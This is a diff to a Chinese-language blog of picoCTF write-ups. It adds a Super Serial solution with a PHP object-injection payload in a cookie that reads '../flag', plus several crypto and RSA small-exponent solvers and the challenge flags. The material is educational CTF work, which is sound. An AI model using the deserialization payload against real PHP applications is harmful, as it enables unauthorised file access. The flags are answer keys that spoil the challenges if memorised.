@@ -37,7 +37,7 @@ picoCTF{pr3tty_c0d3_dbe259ce}
 這題我們點進 URL 後會看到一個 FLAG 的按鈕，按下去會發現我們不能得到 FLAG。![image](https://hackmd.io/_uploads/SJB9S0p70.png)
 他說我們應該要是 picobrowser，所以我就寫了一個 selenium 的 Python 腳本來運行，看看能不能拿到 flag。
 
-```python=
+```python
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service
 from webdriver_manager.chrome import ChromeDriverManager
@@ -215,13 +215,94 @@ picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
 
 ## Super Serial
 
-這題先讀取`/robots.txt`發現它有一個禁止的路徑為`/admin.phps`，這似乎代表著它有支持`.phps`文件。所以可以到`/index.phps`裡面看它的源代碼。（`phps`為PHP source）
+這題先讀取`/robots.txt`發現它有一個禁止的路徑為`/admin.phps`，這似乎代表著它有支持`.phps`文件。所以可以到`/index.phps`裡面看它的源代碼。（`phps`為 PHP source）
 
 ![index.phps](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704170553939.png)
 
-題目說Flag在`../flag`中，所以解題的思路就是要想辦法讀取到`../flag`。
+題目說 Flag 在`../flag`中，所以解題的思路就是要想辦法讀取到`../flag`。先把圖片上的程式碼拿出來分析一下。
 
-**// TODO**
+```php
+<?php
+require_once "cookie.php";  # 這裡用到了cookie.php
+
+if (isset($_POST["user"]) && isset($_POST["pass"])) {
+    $con = new SQLite3("../users.db");
+    $username = $_POST["user"];
+    $password = $_POST["pass"];
+    $perm_res = new permissions($username, $password);
+    if ($perm_res->is_guest() || $perm_res->is_admin()) {
+        setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + 86400 * 30, "/");
+        header("Location: authentication.php");  # 這裡重定向到authentication.php
+        die();
+    } else {
+        $msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
+    }
+}
+?>
+```
+
+由於可以透過`.phps`查看原始代碼，所以先去查看`cookie.phps`和`authentication.phps`。可以發現在`cookie.php`中有以下漏洞：
+
+```php
+if (isset($_COOKIE["login"])) {
+    try {
+        $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
+        $g = $perm->is_guest();
+        $a = $perm->is_admin();
+    } catch (Error $e) {
+        die("Deserialization error. " . $perm);
+    }
+}
+```
+
+這裡的反序列化是不安全的（題目名稱也有提示是和 Serial 有關），如果反序列化失敗，進入到 catch error 裡面，就會把`$perm`輸出。在`authentication.php`裡面的`access_log`這個類中，他定義了`__toString()`就是讀取並回傳`log_file`的內容。
+
+所以我們只要建立一個`login`的 cookie，並輸入錯誤的值，就可以觸發反序列化的錯誤。下圖中我設置了`login`的值為`TEST`，成功觸發反序列化錯誤的訊息。
+
+![Deserialization error](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706160307961.png)
+
+接著我們用[PHP Sandbox](https://onlinephp.io/)來線上寫一些 php 的程式碼。這邊會這樣寫是因為我們從`cookie.phps`中可以看到原始碼是先 URL decode 再 Base64 decode，最後才反序列化。所以整個流程就是反過來就對了。
+
+```php
+<?php
+print(urlencode(base64_encode(serialize("TEST"))))
+?>
+```
+
+他這邊輸出了`czo0OiJURVNUIjs%3D`，我們把 cookie 的值修改為這個試試看，能不能正確的輸出`TEST`。
+
+![PoC](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706160839984.png)
+
+成功！再來我們只需要 new 一個 access_log 的 class，並且把他的`$log_file`設定為`"../flag"`就可以了！Exploit 如下。
+
+```php
+<?php
+
+class access_log
+{
+	public $log_file = "../flag";
+
+}
+
+$payload = new access_log();
+
+print(urlencode(base64_encode(serialize($payload))))
+?>
+```
+
+上面這個代碼執行後會得到
+
+```
+TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
+```
+
+這個就是我們最終的 Payload 啦，把它貼到`login`的 cookie 的 value，並重新整理頁面試試看吧。
+
+![Pwned!](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706161944368.png)
+
+```
+picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e}
+```
 
 ## Java Code Analysis!?!
 
@@ -233,7 +314,7 @@ picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
 
 ![Home page](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704143405607.png)
 
-題目告訴我們，這題的Winning condition是要讀取到Flag的書籍，就可以獲得Flag了。但是向上圖所看到的，我們現在是Free user，而Flag這本書只有Admin可以閱讀，所以要來想辦法提升權限。
+題目告訴我們，這題的 Winning condition 是要讀取到 Flag 的書籍，就可以獲得 Flag 了。但是向上圖所看到的，我們現在是 Free user，而 Flag 這本書只有 Admin 可以閱讀，所以要來想辦法提升權限。
 
 **// TODO**
 
@@ -280,7 +361,7 @@ Key: SOLVECRYPTO
 這題是一個維吉尼亞密碼。維吉尼亞密碼（法語：Chiffre de Vigenère，又譯維熱納爾密碼）是使用一系列凱撒密碼組成密碼字母表的加密算法，屬於多表密碼的一種簡單形式。[維基百科](https://zh.wikipedia.org/zh-tw/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81)
 解密的方式也很簡單，最上面一列是明文，最左邊那行是 KEY，這樣對應起來中間的字元就是密文。知道了這個之後回推回去就可以得到明文。
 
-```python=
+```python
 cipher = "UFJKXQZQUNB"
 key = "SOLVECRYPTO"
 
@@ -312,7 +393,7 @@ picoCTF{gvswwmrkxlivyfmgsrhnrisegl}
 
 就把裡面那串拿去解密，因為不知道偏移量是多少，所以就暴力破解。
 
-```python=
+```python
 cipher = "gvswwmrkxlivyfmgsrhnrisegl"
 
 
@@ -342,7 +423,7 @@ picoCTF{crossingtherubicondjneoach}
 apbopjbobpnjpjnmnnnmnlnbamnpnononpnaaaamnlnkapndnkncamnpapncnbannaapncndnlnpna
 ```
 
-```python=
+```python
 import string
 
 LOWERCASE_OFFSET = ord("a")
@@ -373,22 +454,95 @@ for i, c in enumerate(b16):
 print(enc)
 ```
 
-先觀察這個加密腳本。發現他是把明文每個字母的 Ascii 值轉為 Binary 後，從左邊補 0 補到 8 個 Bits，然後
+先觀察這個加密腳本。發現他是把明文每個字母的 Ascii 值轉為 Binary 後，從左邊補 0 補到 8 個 Bits，然後每4位元分為一塊，每塊的二進制數字（0～15）映射到Base16的字符集（a～p）。再把這個東西拿去做shift，就是凱薩加密的變形。
+
+總之解密的話就是反著來，就不詳細解釋了。Exploit如下：
+
+```python
+import string
+
+LOWERCASE_OFFSET = ord("a")
+ALPHABET = string.ascii_lowercase[:16]
+
+
+def b16_encode(plain):
+    enc = ""
+    for c in plain:
+        binary = "{0:08b}".format(ord(c))
+        enc += ALPHABET[int(binary[:4], 2)]  # Since 4 bits can represent 16 characters
+        enc += ALPHABET[int(binary[4:], 2)]
+    return enc
+
+
+def b16_decode(b16):
+    dec = ""
+    for c in range(0, len(b16), 2):
+        first = b16[c]
+        second = b16[c + 1]
+        first_index = ALPHABET.index(first)
+        second_index = ALPHABET.index(second)
+        binary = bin(first_index)[2:].zfill(4) + bin(second_index)[2:].zfill(4)
+        dec += chr(int(binary, 2))
+    return dec
+
+
+def shift(c, k):
+    t1 = ord(c) - LOWERCASE_OFFSET  # (c - 97 + k - 97) % 16 = result
+    t2 = ord(k) - LOWERCASE_OFFSET
+    return ALPHABET[(t1 + t2) % len(ALPHABET)]  # two numbers sum modulo 16
+
+
+def inverse_shift(c, k):
+    t1 = ord(c) - LOWERCASE_OFFSET
+    t2 = ord(k) - LOWERCASE_OFFSET
+    return ALPHABET[(t1 - t2) % len(ALPHABET)]  # two numbers difference modulo 16
+
+
+enc = "apbopjbobpnjpjnmnnnmnlnbamnpnononpnaaaamnlnkapndnkncamnpapncnbannaapncndnlnpna"
+for key in ALPHABET:
+    dec = ""
+    for i, c in enumerate(enc):
+        dec += inverse_shift(c, key[i % len(key)])
+    b16_dec = b16_decode(dec)
+    print(f"Decrypted flag: {b16_dec}")
+```
+
+暴力破解後，看起來最像Flag的就是`et_tu?_23217b54456fb10e908b5e87c6e89156`這個了。最後自己幫它包上`picoCTF{}`提交，果然是正確的。
+
+```
+picoCTF{et_tu?_23217b54456fb10e908b5e87c6e89156}
+```
+
+## rotation
+
+這題給了一個加密後的密文。
+
+```
+xqkwKBN{z0bib1wv_l3kzgxb3l_949in1i1}
+```
+
+看起來就是Transposition Cipher，直接拿去網路上那種凱薩密碼暴力破解。這邊使用[CyberChef](https://gchq.github.io/CyberChef/)。
+
+![Pwned!](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706165309173.png)
+
+```
+picoCTF{r0tat1on_d3crypt3d_949af1a1}
+```
 
 ## Mind your Ps and Qs
 
-這題是個 RSA 加密，先來複習一下 RSA 加密裡面的各個參數。
-:::info
-Find two prime numbers p & q
-n = p _ q
-phi(n) = (p-1) _ (q-1)
-e is the encryption exponent
-d = e^-1 mod phi(n)
-c is the encrypted message; c = m^e mod n
-m is the message; m = c^d mod n
-Public key = (e, n)
-Private key = (d, n)
-:::
+這題是個 RSA 加密，先來複習一下 RSA 加密裡面的流程和參數。
+
+-   $\text{Find two prime numbers } p \text{ and } q$
+-   $n = p \times q$
+-   $\phi(n) = (p-1) \times (q-1)$
+-   $e \text{ is the encryption exponent}$
+-   $d = e^{-1} \mod \phi(n)$
+-   $c \text{ is the encrypted message}; \quad c = m^e \mod n$
+-   $m \text{ is the message}; \quad m = c^d \mod n$
+-   $\text{Public key} = (e, n)$
+-   $\text{Private key} = (d, n)$
+
 複習完後，看一下題目的說明。
 
 ```
@@ -407,7 +561,7 @@ e: 65537
 
 而有了 P 和 Q，我們就可以順著 RSA 流程找到明文 M 了，我寫了個 Python 幫我找出明文，如下
 
-```python=
+```python
 from Crypto.Util.number import inverse, long_to_bytes
 from factordb.factordb import FactorDB
 
@@ -463,7 +617,7 @@ Here you go: 2902750301958500394734566183674558850699657488512780767567437204467
 
 接著只要再利用 Crypto 的 long_to_bytes3 方法就可以找到明文，如下:
 
-```python=
+```python
 from Crypto.Util.number import long_to_bytes
 from pwn import *
 
@@ -487,13 +641,13 @@ picoCTF{m4yb3_Th0se_m3s54g3s_4r3_difurrent_1772735}
 
 ## interencdec
 
-題目給了密文enc_flag，如下。
+題目給了密文 enc_flag，如下。
 
 ```
 YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6YzRNalV3YUcxcWZRPT0nCg==
 ```
 
-因為他最後面的兩個`==`讓他看起來很像是base64的格式，所以就用base64先Decode一下。這邊用的是[CyberChef](https://gchq.github.io/CyberChef/)這款工具，他可以線上進行很多種的編碼解碼、加密等等。
+因為他最後面的兩個`==`讓他看起來很像是 base64 的格式，所以就用 base64 先 Decode 一下。這邊用的是[CyberChef](https://gchq.github.io/CyberChef/)這款工具，他可以線上進行很多種的編碼解碼、加密等等。
 
 ![b64 decode](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704163439113.png)
 
@@ -501,7 +655,7 @@ YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6YzRNalV3YUcxcWZRPT0nCg==
 d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrXzc4MjUwaG1qfQ==
 ```
 
-解碼一次後長這樣，還是很像base64的格式，所以我又做了一次base64解碼。（注意：這邊要把前面的b拿掉，只留引號中的內容）
+解碼一次後長這樣，還是很像 base64 的格式，所以我又做了一次 base64 解碼。（注意：這邊要把前面的 b 拿掉，只留引號中的內容）
 
 ![b64 decode](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704163700571.png)
 
@@ -509,7 +663,7 @@ d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrXzc4MjUwaG1qfQ==
 wpjvJAM{jhlzhy_k3jy9wa3k_78250hmj}
 ```
 
-再解碼一次後變成了這樣的形狀，看起來已經有Flag的雛型了（因為大括號），所以猜測它是某種置換密碼。就用最普遍的凱薩密碼來暴力解解看吧！Exploit如下：
+再解碼一次後變成了這樣的形狀，看起來已經有 Flag 的雛型了（因為大括號），所以猜測它是某種置換密碼。就用最普遍的凱薩密碼來暴力解解看吧！Exploit 如下：
 
 ```python
 enc_flag = input("Enter the encrypted flag: ")
@@ -575,7 +729,7 @@ def encrypt(key_location):
 
 知道了我們第一次輸入要加密的銘文是從第 32 個 key 開始後，我們要想辦法可以使用到跟題目一樣的那組 key，而在程式碼的這個區段我們可以發現一些事。
 
-```python=
+```python
 if stop >= KEY_LEN:
         stop = stop % KEY_LEN
         key = kf[start:] + kf[:stop]
@@ -587,7 +741,7 @@ if stop >= KEY_LEN:
 
 > $$key \oplus pt = ct$$ $$key \oplus ct = pt$$ $$pt \oplus ct = key$$
 
-```python=
+```python
 from pwn import *
 import binascii  # binascii.unhexlify() is used to convert hex to binary
 
@@ -628,7 +782,7 @@ print(flag)
 
 這題給了兩個檔案。一個是加密後的 flag，裡面還包含了加密需要的一些變量；另一個是加密腳本。既然給了腳本，那就先來看看 Code 吧。我結合了題目給的加密後的 flag 的資訊，把註解直接寫在了代碼裡面，看看吧！
 
-```python=
+```python
 from random import randint
 import sys
 
@@ -720,7 +874,7 @@ flag = ABC
 
 希望這樣解釋有比較清楚一點！總之照這樣解密就可以得到 flag 啦，以下是我的解密的代碼：
 
-```python=
+```python
 def decrypt(cipher: list, key: int, text_key: str) -> str:
     semi_cipher = ""
     for encrypted_value in cipher:
@@ -806,7 +960,7 @@ e = 3
 c = 1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106
 
 # 暴力破解 k * n + c 的 e 次方根
-k = 1
+k = 0
 while True:
     m, is_root = gmpy2.iroot(k * n + c, e)
     if is_root:
@@ -824,6 +978,35 @@ print(long_to_bytes(m).decode())
 
 ```
 picoCTF{e_sh0u1d_b3_lArg3r_7adb35b1}
+```
+
+## miniRSA
+
+這題的原理和上面那題一模一樣，都是e太小所以用小公鑰指數攻擊。想知道更詳細原理看[上面那題](http://localhost:4000/CTF/All-in-One%20PicoCTF-Writeups/#Mini-RSA)，這邊直接上Exploit。
+
+```python
+import gmpy2
+from Crypto.Util.number import long_to_bytes
+
+# 宣告題目所給的n, e, c
+n = 29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673
+e = 3
+c = 2205316413931134031074603746928247799030155221252519872650080519263755075355825243327515211479747536697517688468095325517209911688684309894900992899707504087647575997847717180766377832435022794675332132906451858990782325436498952049751141
+# 暴力破解 k * n + c 的 e 次方根
+k = 0
+while True:
+    m, is_root = gmpy2.iroot(k * n + c, e)
+    if is_root:
+        break
+    else:
+        k += 1
+
+# 數字轉字串
+print(long_to_bytes(m).decode())
+```
+
+```
+picoCTF{n33d_a_lArg3r_e_d0cd6eae}
 ```
 
 # Pwn (Binary Exploitation)
@@ -926,7 +1109,7 @@ High Address
 Low Address
 ```
 
-最後試出來的Payload是24個字元加上一個大寫的A（因為`ord(A) == 65`），但是在這裡我有點不理解為甚麼前面是24個填充，猜測是`input[16]`跟`num`中間有Padding之類的東西。如果有人知道的話再麻煩跟我解釋一下，感謝了！總之，還是拿到Flag啦。
+最後試出來的 Payload 是 24 個字元加上一個大寫的 A（因為`ord(A) == 65`），但是在這裡我有點不理解為甚麼前面是 24 個填充，猜測是`input[16]`跟`num`中間有 Padding 之類的東西。如果有人知道的話再麻煩跟我解釋一下，感謝了！總之，還是拿到 Flag 啦。
 
 ![Flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704141242017.png)
 
@@ -1024,7 +1207,7 @@ picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
 
 Exploit 如下：
 
-```python=
+```python
 from PIL import Image
 import re
 
